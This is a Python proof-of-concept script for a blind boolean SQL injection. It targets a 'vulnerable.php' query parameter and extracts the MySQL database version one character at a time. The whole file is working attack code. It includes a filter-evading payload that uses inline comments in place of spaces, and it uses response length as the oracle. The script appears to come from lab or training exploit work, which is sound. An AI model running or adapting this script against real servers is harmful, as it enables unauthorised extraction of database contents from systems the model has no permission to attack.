import requests
import sys

def sqli(ip, inj_str):
    for j in range(32, 126):
        # iterate over all relevant ascii values
        target = "http://%s/vulnerable.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving database version as example PoC (MySQL)....")

    # set length according to target (if known beforehand, otherwise use high number)
    for i in range(1, 20):
        # use ascii representatives to avoid any potential payload restrictions (like f.e. no whitespaces allowed)
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()
